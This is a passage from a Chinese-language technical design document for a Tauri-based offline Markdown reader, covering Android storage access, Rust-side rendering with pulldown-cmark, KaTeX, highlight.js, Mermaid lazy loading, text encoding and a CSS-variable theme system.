# Tauri Markdown 阅读器 · 技术方案

> 目标平台：Android(主) / Windows / macOS / Linux(附赠)
> 文档版本：**v2.0** · 2026-08-11
> 依赖版本均以 2026-08 实际发布状态为准
>
> **v2.0 是一次以「能否直接照着开发」为标准的全面审查修订。**
> 修正了 5 处会导致代码无法运行的错误，补齐 4 块缺失内容。详见附录 C 勘误表。

---

## 1. 项目定位与范围

### 1.1 要做什么

一个**离线优先的 Markdown 阅读器**。核心价值是「把本地文件夹里的 `.md` 文档渲染得和 GitHub 一样好看」，而不是编辑器。

### 1.2 范围界定

| 纳入 v1 | 明确不做 |
|---|---|
| 打开本地文件夹，浏览其中的 md 文件 | **Markdown 编辑 / 实时预览** |
| GFM 全套（表格、任务列表、删除线、脚注） | 云同步 / 账号体系 |
| 代码高亮、LaTeX 公式、Mermaid 图表 | 插件市场 |
| 文档内相对路径图片 | 协作批注 |
| 主题系统（内置 3 套 + 用户自定义） | Wiki 双链、关系图谱（v2 评估） |
| 目录导航（TOC）、阅读进度记忆 | Git 同步（v2 评估） |
| **全文搜索**（跨文件 + 文档内） | 朗读 TTS（v2 评估） |
| **文档间 md 互跳 + 导航栈** | 桌面小组件（v2 评估） |
| **系统分享接收**（从其他 app 打开） | |
| **图片查看器**（放大 / 双指缩放） | |

**只读定位是关键决策**。它让我们绕开了 Tauri 在 Android 上写文件的已知缺陷（见 §11.2），也让预渲染和缓存策略变得简单。

产品文案中应明确写出「这是阅读器」。一旦支持编辑，就要面对撤销栈、自动保存、冲突检测、语法辅助，复杂度翻数倍，而市面上编辑器已足够多。**做一个「打开任何 md 都渲染得最好看」的阅读器，定位反而更清晰。**

---

## 2. 架构总览

```
┌──────────────────────────────────────────────────────────┐
│  WebView (Android System WebView / WebView2 / WKWebView)  │
│  ┌────────────────────────────────────────────────────┐  │
│  │  Svelte 5 App                                      │  │
│  │  ├── 文件树侧栏 / TOC 抽屉 / 设置面板              │  │
│  │  └── ArticleView  ← 注入 Rust 返回的 HTML          │  │
│  │       ├── KaTeX auto-render   (公式)               │  │
│  │       ├── highlight.js        (代码)               │  │
│  │       └── Mermaid (懒加载)    (图表)               │  │
│  └────────────────────────────────────────────────────┘  │
└────────────────────────┬─────────────────────────────────┘
                         │ invoke / IPC
┌────────────────────────┴─────────────────────────────────┐
│  Rust Core                                                │
│  ├── render_markdown()   pulldown-cmark → HTML            │
│  ├── list_dir()          目录树枚举                        │
│  ├── read_doc()          读文件 + 相对图片路径重写         │
│  └── 状态：Room 替代品 = SQLite (tauri-plugin-sql)         │
└────────────────────────┬─────────────────────────────────┘
                         │ FsUri (SAF)
┌────────────────────────┴─────────────────────────────────┐
│  tauri-plugin-android-fs   ← Android 专用                 │
│  tauri-plugin-fs           ← 桌面端                       │
└──────────────────────────────────────────────────────────┘
```

### 2.1 职责切分原则

**Rust 做「一次性、纯计算、和文件系统打交道」的事；前端做「和视觉相关、需要 DOM 的事」。**

Markdown → HTML 放在 Rust，是因为它是纯字符串变换，pulldown-cmark 比任何 JS 解析器都快，而且大文档不会阻塞 UI 线程。而公式、高亮、图表必须在前端做——它们本质上需要测量和布局。

---

## 3. 技术选型

### 3.1 前端框架：Svelte 5

这是本方案中最需要论证的一项。候选与结论：

| 框架 | 运行时体积 | 大 HTML 注入 | 移动端表现 | 结论 |
|---|---|---|---|---|
| **Svelte 5** | ~5KB | `{@html}` 原生支持，零开销 | 编译期消解，无 VDOM diff | **✅ 采用** |
| SolidJS | ~7KB | `innerHTML` 属性直通 | 细粒度响应式，同样优秀 | 🟡 可替代 |
| Vue 3 | ~34KB | `v-html` | 可用，但 VDOM 是纯负担 | 🟡 团队熟悉可选 |
| React 19 | ~45KB | `dangerouslySetInnerHTML` | 最重，且要跟 VDOM 对抗 | ❌ 不推荐 |

**为什么 Svelte 特别适合这个场景：**

1. **我们的核心操作是「往 DOM 里塞一大段服务端生成的 HTML」**。这恰好是虚拟 DOM 最不擅长、也最没价值的场景——VDOM 的 diff 能力在这里完全用不上，只剩下开销。Svelte 编译期消解组件，`{@html htmlString}` 就是一次 `innerHTML` 赋值。

2. **移动端首屏敏感**。Svelte 5 的 runtime 只有 5KB 级别，比 React 小一个数量级。在中低端安卓机上，这直接体现为可感知的启动速度差异。

3. **Runes（`$state` / `$derived` / `$effect`）让状态逻辑极简**。这个 app 的状态很少：当前文档、字号、主题、滚动位置。用 runes 写下来不到 50 行，不需要 Redux/Pinia 这类状态管理库。

4. **和 KaTeX / Mermaid 这类命令式库配合顺畅**。这些库都要求「拿到真实 DOM 节点，然后我改它」。Svelte 的 `$effect` + `bind:this` 天然契合，不需要像 React 那样和渲染周期斗智斗勇。

**如果团队完全不接受 Svelte**：选 Vue 3，别选 React。原因是 React 的 StrictMode 双调用 + 严格的副作用模型，会让「注入 HTML 后调用 KaTeX 渲染」这个操作变得意外地难写对。

### 3.2 完整技术栈

| 层 | 选择 | 版本 | 备注 |
|---|---|---|---|
| 框架 | Tauri | `2.11.x` | 2024-10 GA，含 Android/iOS |
| 前端 | Svelte + Vite + TypeScript | Svelte `^5` | `create-tauri-app` 有官方模板 |
| MD 解析 | `pulldown-cmark` | `0.13.4` | 纯 Rust，SIMD 加速，无 unsafe |
| 安卓文件 | `tauri-plugin-android-fs` | `29.0.0` | ⚠️ 第三方，见 §11.1 |
| 桌面文件 | `tauri-plugin-fs` + `-dialog` | `2.x` | 官方 |
| 公式 | KaTeX | `0.18.1` | ⚠️ 0.18 有 breaking，见 §5.3 |
| 高亮 | highlight.js | `^11` | 需裁剪语言包 |
| 图表 | Mermaid | `^11` | 懒加载，非首屏 |
| 样式 | github-markdown-css | `^5` | 作为主题变量的取值参考 |
| 持久化 + 搜索 | `tauri-plugin-sql` (SQLite) | `2.x` | 含 FTS5 全文索引，见 §7.3 |
| 剪贴板 | `tauri-plugin-clipboard-manager` | `2.x` | 代码块复制 |
| 分享接收 | `tauri-plugin-deep-link` | `2.x` | 接收系统 VIEW intent |

**依赖版本注意事项：**

- `tauri-plugin-android-fs 29.0.0` 要求 `tauri >= 2.8.2`、Rust MSRV `1.77.2`。它版本号迭代极快（一年内发了 130+ 个版本，major 版号已到 29），**必须在 Cargo.toml 里锁精确版本**，不要用 `^`。
- `pulldown-cmark` 建议开 `simd` feature（x86_64 桌面端受益，ARM 上自动回退）。
- SQLite 需确认打包的版本**编译时启用了 FTS5**。`tauri-plugin-sql` 底层用 `sqlx`，绝大多数发行版默认带 FTS5，但建议在 M4 阶段先跑一条 `CREATE VIRTUAL TABLE ... USING fts5` 验证。

### 3.3 Rust 侧 Cargo.toml 关键部分

```toml
[dependencies]
tauri = { version = "2.11", features = [] }
tauri-plugin-fs = "2"
tauri-plugin-dialog = "2"
tauri-plugin-sql = { version = "2", features = ["sqlite"] }
tauri-plugin-clipboard-manager = "2"
tauri-plugin-deep-link = "2"
pulldown-cmark = { version = "0.13.4", default-features = false, features = ["html"] }
ammonia = "4"                 # HTML 消毒，见 §9.4
encoding_rs = "0.8"           # 非 UTF-8 文件兜底，见 §5.6
serde = { version = "1", features = ["derive"] }
thiserror = "2"

[target.'cfg(target_os = "android")'.dependencies]
tauri-plugin-android-fs = "=29.0.0"   # 锁死，此 crate 迭代激进

[profile.release]
lto = true
codegen-units = 1
strip = true
# 注意：这里刻意不写 panic = "abort"，原因见下
```

**关于 `panic = "abort"` —— 不要加。**

pulldown-cmark 的 README 推荐 `panic = "abort"`，很多 Rust 优化指南也这么说，但**在 Tauri 移动端这是个陷阱**：

- Android 上 Rust 代码通过 JNI 被调用，Tauri 需要 unwind 机制把 Rust panic 转成可捕获的错误再传回 WebView
- `panic = "abort"` 会让任何 panic 直接 `SIGABRT` 杀掉整个进程，用户看到的是**闪退而不是错误提示**
- 一个越界索引、一个 `unwrap()` 失败，本来只该让当前文档渲染失败，结果整个 app 挂掉

体积收益（约几百 KB）远不值这个稳定性代价。`lto` + `codegen-units = 1` + `strip` 三项已经能把 APK 从 ~8MB 压到 ~4–5MB。

**配套要求**：Rust 侧所有 `#[tauri::command]` **禁止使用 `unwrap()` / `expect()`**，一律返回 `Result`。详见 §9.5 错误处理约定。

**关于 `simd` feature**：`pulldown-cmark` 的 SIMD 只支持 x86_64，Android 的 ARM 平台不受益。如果要开，用 target 条件化，不要无脑加：

```toml
[target.'cfg(target_arch = "x86_64")'.dependencies]
pulldown-cmark = { version = "0.13.4", default-features = false, features = ["html", "simd"] }
```

实际上桌面端解析速度早已够快，**建议直接不开**，少一个变量。

**关于 `default-features = false`**：这是必要的——pulldown-cmark 默认 features 含 `getopts`（用于构建它自带的命令行工具），我们只需要 `html`。

---

## 4. 文件访问设计（最关键的一块）

### 4.1 问题背景

Android 的 Storage Access Framework 是本项目最大的技术障碍：

- 用户选择文件夹后，系统返回的是 **tree URI**（`content://...`），不是文件路径
- 一个目录实际对应**三个不可互相推导的 URI**：tree URI、document URI、child document URI
- Tauri 官方 `FilePath` 类型只能存一个值，因此**官方 dialog 插件至今没有实现 Android 的 `pick_folder`**
  （issue `tauri-apps/plugins-workspace#933`，2024 年初至今未解决；`tauri-apps/tauri#14587` 仍在讨论设计）

**而文件夹访问对本项目是不可绕过的**——因为要支持 `![](./img/a.png)` 相对路径图片，必须持有整棵目录树。

### 4.2 解决方案

使用 `tauri-plugin-android-fs`。这是社区维护的 crate，专门补齐了官方缺失的部分：

```rust
use tauri_plugin_android_fs::{AndroidFsExt, Entry};

#[tauri::command]
async fn pick_vault(app: tauri::AppHandle) -> AppResult<Option<String>> {
    let api = app.android_fs_async();

    let Some(dir_uri) = api.picker().pick_dir(None, false).await? else {
        return Ok(None); // 用户取消
    };

    // 关键：持久化权限，否则重启后失效
    api.picker().persist_uri_permission(&dir_uri).await?;

    Ok(Some(dir_uri.to_string()?))
}

#[tauri::command]
async fn list_dir(app: tauri::AppHandle, uri: String) -> AppResult<Vec<FileNode>> {
    let api = app.android_fs_async();
    let dir_uri = FsUri::from_str(&uri)?;

    let mut nodes = Vec::new();
    for entry in api.read_dir(&dir_uri).await? {
        match entry {
            Entry::File { uri, name, .. } if is_markdown(&name) => {
                nodes.push(FileNode::file(name, uri));
            }
            Entry::Dir { uri, name, .. } if !name.starts_with('.') => {
                nodes.push(FileNode::dir(name, uri));
            }
            _ => {}
        }
    }
    nodes.sort_by(|a, b| a.sort_key().cmp(&b.sort_key()));
    Ok(nodes)
}

/// 扩展名判断要大小写不敏感，且覆盖 .markdown
fn is_markdown(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    lower.ends_with(".md") || lower.ends_with(".markdown") || lower.ends_with(".mdx")
}
```

三处相比 v1.1 的修正：

1. **错误处理**：改用 `AppResult`（见 §9.5），不再把错误压成字符串。`AppError` 需要为插件错误类型实现 `From`。
2. **`name.ends_with(".md")` 大小写敏感**——`README.MD` 会被漏掉。抽成 `is_markdown()` 统一处理，并覆盖 `.markdown` / `.mdx`。
3. **跳过隐藏目录**：`.git`、`.obsidian`、`.themes` 这些不该出现在文件树里。`.git` 目录里可能有上万个文件，不跳过会让首次索引极慢。
4. **排序**：SAF 的 `read_dir` **不保证返回顺序**，必须显式排序，否则每次打开文件树顺序都不一样。建议目录在前、同类按名称自然排序（`10.md` 排在 `9.md` 之后而非之前）。

### 4.3 相对路径图片的解析

这是整个项目实现难度最高的一环。流程：

1. 用户选择「文档库」根目录 → 得到 tree URI，持久化
2. 打开某篇文档时，记住它在树中的**父目录 URI**
3. Rust 解析 Markdown 时拦截所有 image 节点，把 `./img/a.png` 这类相对路径解析成对应的 `content://` URI
4. 通过 Tauri 自定义协议（`tauri-plugin-android-fs` 的 `protocol-content` feature）把 URI 转成 WebView 可加载的地址

```rust
use pulldown_cmark::{Event, Parser, Tag, Options};

fn rewrite_images<'a>(
    parser: Parser<'a>,
    base_dir: &FsUri,
    api: &AndroidFs,
) -> impl Iterator<Item = Event<'a>> {
    parser.map(move |event| match event {
        Event::Start(Tag::Image { dest_url, title, id, link_type }) => {
            let resolved = if dest_url.starts_with("http") {
                dest_url  // 外链原样保留
            } else {
                resolve_to_content_url(base_dir, &dest_url, api).into()
            };
            Event::Start(Tag::Image { dest_url: resolved, title, id, link_type })
        }
        other => other,
    })
}
```

pulldown-cmark 的 pull parser 架构在这里体现出优势——用 `.map()` 就能改写事件流，不需要构建 AST。

### 4.4 平台差异抽象

**⚠️ 不要用 trait。** 直觉写法是定义 `trait VaultAccess { async fn ... }`，但含 `async fn` 的 trait **不是 dyn 兼容的**（async 方法返回的 Future 是不定大小的关联类型）。想用 `Box<dyn VaultAccess>` 就必须引入 `async-trait` 宏或 `dynosaur`，每次调用都堆分配——为一个只有两种实现、且编译期就能确定的场景付这个代价，不值得。

**正确做法：用 `#[cfg]` 做编译期分发，暴露同名的自由函数。**

```rust
// src-tauri/src/vault/mod.rs
#[cfg(target_os = "android")]
mod android;
#[cfg(not(target_os = "android"))]
mod desktop;

#[cfg(target_os = "android")]
use android as imp;
#[cfg(not(target_os = "android"))]
use desktop as imp;

/// 统一的库标识：Android 上是 SAF tree URI 字符串，桌面上是绝对路径
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VaultRef(pub String);

/// 库内某个条目的标识
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EntryRef(pub String);

pub async fn pick_root(app: &AppHandle) -> Result<Option<VaultRef>, VaultError> {
    imp::pick_root(app).await
}

pub async fn list(app: &AppHandle, dir: &EntryRef) -> Result<Vec<FileNode>, VaultError> {
    imp::list(app, dir).await
}

pub async fn read_text(app: &AppHandle, f: &EntryRef) -> Result<String, VaultError> {
    imp::read_text(app, f).await
}

/// 把条目转成 WebView 可直接加载的 URL（图片用）
pub fn asset_url(app: &AppHandle, f: &EntryRef) -> Result<String, VaultError> {
    imp::asset_url(app, f)
}
```

两个 `imp` 模块各自实现这四个函数，签名完全一致。零运行时开销，编译期就只有一份代码进二进制。

**顺带修正原设计的一处语义混乱**：`pick_root` 返回的是「库」，而 `list` / `read_text` 操作的是「库内条目」，两者不该共用一个 `VaultId` 类型。上面拆成 `VaultRef` 和 `EntryRef` 后语义清晰，也避免了误把库 URI 传给读文件函数。

如果将来真需要运行时多态（比如同时支持本地库和 WebDAV 库），再引入 `enum VaultBackend { Local, WebDav }` 做分发，仍然比 `dyn` + 堆分配划算。

---

## 5. 渲染管线设计

### 5.1 数据流

```
点击文件
  → invoke('read_doc', { uri })
      Rust: 读文本 → pulldown-cmark 解析 → 重写图片 → 输出 HTML + TOC
  → 前端拿到 { html, toc, headings }
  → 容器 opacity: 0，注入首屏块的 {@html html}
  → 依次执行：highlight.js → KaTeX → （视口内的）Mermaid
  → 首屏完成后 opacity: 1，恢复滚动位置
  → 后续块：滚动触发追加，各自独立跑增强管线（不再改 opacity）
```

**「先渲染后显示」只作用于首屏块**。它解决了三个问题：公式从 `$...$` 跳变的闪烁、代码块从无色变彩色的闪烁、以及公式撑开高度导致的滚动位置错位。代价是首屏多等 100–300ms，用户感知为「加载」而非「抽搐」。

**⚠️ 与分块渲染（§8.1）的配合规则**（原 v1.1 未说明，实现时必然踩坑）：

| | 首屏块 | 后续块 |
|---|---|---|
| opacity 控制 | 有，全部增强完成才显示 | 无，直接追加 |
| 追加时机 | 立即 | `IntersectionObserver` 触发哨兵 |
| 增强范围 | 整块 | **只对新追加的节点跑**，不能重扫全文 |
| 滚动位置 | 增强完成后恢复 | 不动 |

后续块之所以不需要 opacity 控制，是因为它们在视口下方，用户看不到跳变。而且给它们加 opacity 反而有害——会造成「滚到底部看到一片空白」。

**增强管线必须支持增量调用**，签名要接受作用范围：

```ts
async function enhance(scope: HTMLElement, isFirstChunk: boolean) {
  highlightWithin(scope);              // 只处理 scope 内的 pre>code
  renderMathInElement(scope, katexOpts);
  observeMermaidWithin(scope);
  if (isFirstChunk) {
    scope.closest('.markdown-body')!.style.opacity = '1';
    restoreScrollPosition();
  }
}
```

如果 `enhance` 每次都对整个 `.markdown-body` 跑，追加到第 10 块时会重复处理前 9 块，越滚越卡。

### 5.2 Rust 侧解析

```rust
use pulldown_cmark::{html, Options, Parser};

fn build_options() -> Options {
    let mut opts = Options::empty();
    opts.insert(Options::ENABLE_TABLES);
    opts.insert(Options::ENABLE_FOOTNOTES);
    opts.insert(Options::ENABLE_STRIKETHROUGH);
    opts.insert(Options::ENABLE_TASKLISTS);
    opts.insert(Options::ENABLE_HEADING_ATTRIBUTES);
    opts.insert(Options::ENABLE_YAML_STYLE_METADATA_BLOCKS); // front matter
    opts
}
```

`ENABLE_HEADING_ATTRIBUTES` 必须开——TOC 跳转和阅读进度都依赖标题上的 `id`。

**⚠️ 刻意不开 `ENABLE_SMART_PUNCTUATION`**（v1.1 里开了，是个错误）。它会把 `--` 转成 en dash、`"` 转成弯引号。对英文散文是加分，但对技术文档是**破坏性的**：

- 正文里写 `--no-default-features` 会被转成 `–no-default-features`，用户复制出去命令跑不了
- 中文文档里的直角引号处理不符合中文排版习惯

代码块内部不受影响（parser 不处理 code 内容），但**行内代码之外的命令行参数很常见**。技术文档场景应关闭。

`String::with_capacity` 预分配能避免大文档反复扩容，实测万行文档节省约 20% 渲染时间。

### 5.3 公式：KaTeX

**⚠️ 版本重要提示：KaTeX 0.18.0（2026-07-17）引入了 breaking change——所有内部 CSS 类名加了前缀。** 如果你写了任何针对 KaTeX 内部类的自定义样式，升级时必须同步改选择器。本方案建议直接用 `0.18.1`，从一开始就按新类名写；若参考旧教程代码，注意其针对的是 `0.16.x`。

**为什么不在 Rust 侧预渲染公式**（修正上一版想法）：`katex-rs` 之类的绑定需要内嵌 JS 引擎（QuickJS/Duktape），交叉编译到 Android NDK 麻烦且明显增大 APK。纯 Rust 的 `pulldown-latex` 输出 MathML，虽然可行，但排版质量（分式间距、大型运算符缩放）明显不如 KaTeX。**结论：公式在前端用 KaTeX JS 渲染，靠 §5.1 的「先渲染后显示」消除闪烁。**

资源加载顺序（在 `index.html`，CSS 必须最先）：

```html
<link rel="stylesheet" href="/vendor/katex/katex.min.css">
<script defer src="/vendor/katex/katex.min.js"></script>
<script defer src="/vendor/katex/contrib/auto-render.min.js"></script>
```

三个文件的版本号必须**完全一致**。混用不同小版本会导致 `\begin{aligned}` 等环境**静默消失，无任何报错**——排查起来极其痛苦。

渲染配置：

```ts
renderMathInElement(container, {
  delimiters: [
    { left: '$$',  right: '$$',  display: true  },
    { left: '$',   right: '$',   display: false },
    { left: '\\[', right: '\\]', display: true  },
    { left: '\\(', right: '\\)', display: false },
  ],
  throwOnError: false,
  ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
});
```

两个细节：

- `throwOnError: false` — 单个公式写错时只标红那一处，不至于整篇崩掉
- `ignoredTags` 含 `pre`/`code` — 否则代码块里的 `$PATH`、`$1` 会被误当公式吃掉

**字体必须完整随包**：把 `node_modules/katex/dist/fonts/` 整个目录（约 60 个 woff2，压缩后 1MB 出头）拷进 `public/vendor/katex/fonts/`。只拷 CSS 不拷字体时，联网状态下浏览器可能回退到 CDN 而看起来正常，**一断网就全塌**——测试时务必开飞行模式验证。

### 5.4 代码高亮

highlight.js 全量包超过 1MB。按需注册常用语言，裁到约 100KB：

```ts
import hljs from 'highlight.js/lib/core';
import javascript from 'highlight.js/lib/languages/javascript';
import typescript from 'highlight.js/lib/languages/typescript';
import python from 'highlight.js/lib/languages/python';
import rust from 'highlight.js/lib/languages/rust';
import bash from 'highlight.js/lib/languages/bash';
import json from 'highlight.js/lib/languages/json';
import yaml from 'highlight.js/lib/languages/yaml';
// ... 约 15 种

// 必须显式给出语言名 —— 语言模块导出的是工厂函数，
// 其 .name 经打包器压缩后不可靠，不能用 lang.name 自动推导
hljs.registerLanguage('javascript', javascript);
hljs.registerLanguage('typescript', typescript);
hljs.registerLanguage('python', python);
hljs.registerLanguage('rust', rust);
hljs.registerLanguage('bash', bash);
hljs.registerLanguage('json', json);
hljs.registerLanguage('yaml', yaml);
```

**别名要一并注册**，否则 ```js / ```sh / ```yml 这些常见写法不会高亮：

```ts
hljs.registerAliases(['js'], { languageName: 'javascript' });
hljs.registerAliases(['ts'], { languageName: 'typescript' });
hljs.registerAliases(['sh', 'shell', 'zsh'], { languageName: 'bash' });
hljs.registerAliases(['yml'], { languageName: 'yaml' });
hljs.registerAliases(['py'], { languageName: 'python' });
hljs.registerAliases(['rs'], { languageName: 'rust' });
```

**不要用 `hljs.highlightAll()`**——它会扫全文档，与 §5.1 的增量增强冲突。用 `highlightElement` 逐个处理 scope 内节点：

```ts
export function highlightWithin(scope: HTMLElement) {
  scope.querySelectorAll<HTMLElement>('pre > code:not(.hljs)').forEach((el) => {
    if (el.classList.contains('language-mermaid')) return;   // 跳过图表
    hljs.highlightElement(el);
  });
}
```

`:not(.hljs)` 选择器保证不会重复处理——hljs 处理后会加上这个类。

### 5.5 Mermaid：必须懒加载

Mermaid 本身约 1MB+ 且渲染吃 CPU。一篇带十张流程图的文档如果同步渲染，首屏会明显卡顿。

```ts
const observer = new IntersectionObserver(async (entries) => {
  for (const entry of entries) {
    if (!entry.isIntersecting) continue;
    const el = entry.target as HTMLElement;
    el.dataset.mermaidSrc = el.textContent ?? '';   // 存原文，切主题时要用
    const mermaid = (await import('mermaid')).default;
    await mermaid.run({ nodes: [el] });
    observer.unobserve(el);
  }
}, { rootMargin: '200px' });

container.querySelectorAll('pre > code.language-mermaid')
  .forEach((el) => observer.observe(el));
```

`rootMargin: '200px'` 让图表在滚到之前提前渲染，用户感觉不到延迟。文档里没有 Mermaid 图时，这 1MB 完全不会被下载。

### 5.6 文本编码与换行符（中文场景高频坑）

编码问题是中文用户最容易撞上的一类故障，且症状往往很迷惑。

**问题一：非 UTF-8 文件。** 很多来自 Windows 的老文档是 GBK/GB18030。`String::from_utf8` 会直接报错，用户看到「打开失败」却不知道为什么。

```rust
use encoding_rs::{GB18030, UTF_8};

fn decode_text(bytes: &[u8]) -> (String, &'static str) {
    // 1. 优先尝试 UTF-8（含 BOM 检测）
    if let Some(stripped) = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]) {
        if let Ok(s) = std::str::from_utf8(stripped) {
            return (s.to_owned(), "UTF-8 (BOM)");
        }
    }
    if let Ok(s) = std::str::from_utf8(bytes) {
        return (s.to_owned(), "UTF-8");
    }
    // 2. 回退 GB18030（GBK 的超集，兼容 GB2312）
    let (cow, _, had_errors) = GB18030.decode(bytes);
    if !had_errors {
        return (cow.into_owned(), "GB18030");
    }
    // 3. 最后兜底：UTF-8 有损解码，坏字节变 U+FFFD，至少能显示
    (UTF_8.decode(bytes).0.into_owned(), "UTF-8 (lossy)")
}
```

**BOM 必须剥掉**。留着的话文档第一个字符是 `U+FEFF`，会导致：首行标题的 `#` 不被识别（变成普通段落）、front matter 的 `---` 失效。这个症状很迷惑——「为什么只有这一个文件的标题不生效」。

**问题二：CRLF。** pulldown-cmark 本身能正确处理 `\r\n`，但**代码块内部的 `\r` 会原样进 HTML**，在 `<pre>` 里可能造成额外空行或影响复制结果。读入后统一规范化：

```rust
let text = text.replace("\r\n", "\n").replace('\r', "\n");
```

**问题三：文件太大。** 应设上限（建议 10MB），超过就拒绝并提示，而不是硬撑到 OOM。

### 5.7 IPC 传输：大 HTML 的性能上限

Tauri 的 IPC 默认把返回值做 JSON 序列化再传给 WebView。一篇 1MB 的 Markdown 渲染出的 HTML 可能有 2–3MB，JSON 序列化 + 解析这个量级的字符串，在中低端安卓机上是**几百毫秒级**的开销，且会造成明显的内存峰值。

三条应对策略，按优先级：

**1. 分块传输（首选）**。§8.1 的分块本来就是为了避免一次注入过多 DOM，顺带也解决了 IPC 问题。每块控制在 100–200KB 以内。

**2. 图片走自定义协议，不走 IPC**。这一点已经在 §4.3 做对了——图片通过 `protocol-content` 让 WebView 直接加载，而不是 base64 塞进 IPC。**如果图片走 IPC，一张 2MB 的截图会直接卡死**。

**3. 超大文档改用 Tauri 的自定义协议返回 HTML**。注册一个 `mdhtml://` 协议，前端用 `fetch()` 拿。这条路径走的是 HTTP 通道而非 JSON IPC，没有序列化开销，且支持流式。仅在实测确有必要时再上，会增加复杂度。

**验收标准**：M4 阶段要用一篇真实的万行文档（比如某个大型开源项目的完整 CHANGELOG）在中低端真机上实测，而不是用几百行的示例文件自我感觉良好。

---

## 6. 主题系统

### 6.1 关键前提：Svelte 的 scoped CSS 对 `{@html}` 无效

Svelte 官方文档明确说明：`{@html}` 注入的内容对 Svelte 是「invisible」的，**不会接收 scoped styles**。在组件里写 `article h1 { ... }` 会被判定为 unused selector，样式打不进正文。

这看似是障碍，实际上**对主题扩展是有利的**——它强制把正文样式做成全局 CSS，而全局 CSS 天生可替换、可热插拔。主题系统因此完全独立于 Svelte 存在，将来换框架也不受影响。

正确写法是 `:global` **块级语法**（配合 CSS 嵌套），而不是给每条规则套 `:global(...)`：

```svelte
<article class="markdown-body" bind:this={el}>
  {@html html}
</article>

<style>
  /* 容器本身用 scoped 即可 */
  .markdown-body {
    background: var(--md-bg);
    color: var(--md-fg);
    font-family: var(--md-font-body);
    font-size: var(--md-font-size);
    line-height: var(--md-line-height);
    max-width: var(--md-measure);
  }

  /* 内部元素必须 global —— 但被父选择器限定了范围，不会泄漏 */
  .markdown-body :global {
    h1, h2 { border-bottom: 1px solid var(--md-border); }
    a { color: var(--md-accent); }
    blockquote { border-left: 4px solid var(--md-quote-bar); }
    pre { background: var(--md-code-bg); }
    code { background: var(--md-inline-code-bg); }
    table th { background: var(--md-table-head); }
    hr { border-color: var(--md-border); }
  }
</style>
```

### 6.2 三层解耦架构

```
Svelte 组件 (scoped)          正文样式 (global)
  侧栏 / TOC / 设置面板   ←→   .markdown-body 全套排版
        ↓                            ↓
        └──── 都只消费 CSS 变量 ──────┘
                     ↓
        主题契约层：一组约定的自定义属性
                     ↓
   html[data-theme="xxx"] 切换取值
                     ↓
  github-light │ github-dark │ sepia │ 用户自定义
```

**核心是「主题契约」**——一组约定好的变量名。之后无论内置主题还是用户手写主题，都只是给这些变量填不同的值。

### 6.3 主题契约变量表

```css
/* themes/_contract.css —— 所有主题必须提供的变量 */
:root {
  /* 基础色 */
  --md-bg:              #ffffff;
  --md-fg:              #1f2328;
  --md-fg-muted:        #59636e;
  --md-accent:          #0969da;
  --md-border:          #d1d9e0;

  /* 块级元素 */
  --md-code-bg:         #f6f8fa;
  --md-inline-code-bg:  #eff1f3;
  --md-quote-bar:       #d1d9e0;
  --md-quote-fg:        #59636e;
  --md-table-head:      #f6f8fa;
  --md-table-stripe:    #ffffff;

  /* 排版 */
  --md-font-body:       -apple-system, 'Noto Sans SC', sans-serif;
  --md-font-mono:       ui-monospace, 'JetBrains Mono', monospace;
  --md-font-size:       16px;
  --md-line-height:     1.7;
  --md-measure:         42em;

  /* 代码高亮（必须变量化，否则主题会割裂） */
  --hljs-keyword:       #cf222e;
  --hljs-string:        #0a3069;
  --hljs-comment:       #59636e;
  --hljs-number:        #0550ae;
  --hljs-function:      #8250df;
  --hljs-type:          #953800;
}
```

### 6.4 内置主题

```css
/* themes/github-dark.css */
html[data-theme="github-dark"] {
  --md-bg:              #0d1117;
  --md-fg:              #e6edf3;
  --md-fg-muted:        #9198a1;
  --md-accent:          #4493f8;
  --md-border:          #3d444d;
  --md-code-bg:         #151b23;
  --md-inline-code-bg:  #262c36;
  --md-quote-bar:       #3d444d;
  --md-table-head:      #151b23;
  --hljs-keyword:       #ff7b72;
  --hljs-string:        #a5d6ff;
  --hljs-comment:       #9198a1;
  --hljs-number:        #79c0ff;
  --hljs-function:      #d2a8ff;
  --hljs-type:          #ffa657;
}

/* themes/sepia.css —— 护眼米黄，长时间阅读 */
html[data-theme="sepia"] {
  --md-bg:              #f4ecd8;
  --md-fg:              #5b4636;
  --md-fg-muted:        #8a7460;
  --md-accent:          #8b5a2b;
  --md-border:          #ddd0b8;
  --md-code-bg:         #ece0c8;
  --md-inline-code-bg:  #e5d7bc;
  --md-quote-bar:       #c9b896;
  --md-table-head:      #ece0c8;
  --md-font-body:       'Noto Serif SC', Georgia, serif;
  --md-line-height:     1.85;
  --md-measure:         38em;
  --hljs-keyword:       #8b5a2b;
  --hljs-string:        #6a7f3f;
  --hljs-comment:       #9c8b73;
  --hljs-number:        #a0522d;
  --hljs-function:      #7b5d8f;
  --hljs-type:          #8b6914;
}
```

代码高亮的配色**必须一起换**：

```css
.hljs-keyword, .hljs-built_in { color: var(--hljs-keyword); }
.hljs-string, .hljs-attr      { color: var(--hljs-string); }
.hljs-comment                 { color: var(--hljs-comment); }
.hljs-number, .hljs-literal   { color: var(--hljs-number); }
.hljs-function, .hljs-title   { color: var(--hljs-function); }
.hljs-type, .hljs-class       { color: var(--hljs-type); }
```

否则会出现「正文是护眼米黄、代码块还是 GitHub 蓝」的割裂感。

### 6.5 Svelte 侧切换逻辑

**⚠️ 这里有个必踩的坑。** 直觉写法是这样：

```ts
// ❌ 错误示范 —— 会在运行时抛 effect_orphan
class Prefs {
  theme = $state('github-dark');
  constructor() {
    $effect(() => { /* ... */ });   // 报错！
  }
}
export const prefs = new Prefs();   // 模块顶层实例化
```

Svelte 会抛出：

```
effect_orphan: `$effect` can only be used inside an effect
(e.g. during component initialisation)
```

原因：`$effect` 只能在组件初始化的追踪作用域内注册。而单例在模块顶层实例化时，还没有任何组件在初始化，Svelte 无从挂载 teardown 逻辑。

**解决方案（推荐）：不用 `$effect`，改用 setter 里做副作用。**

对偏好设置这种「改了就要落盘」的场景，副作用发生的时机是明确的（用户点击的那一刻），根本不需要响应式追踪：

```ts
// lib/stores/prefs.svelte.ts
class Prefs {
  #theme = $state('github-dark');
  #fontSize = $state(16);
  #lineHeight = $state(1.7);

  get theme() { return this.#theme; }
  set theme(v: string) {
    this.#theme = v;
    document.documentElement.dataset.theme = v;
    void this.#persist();
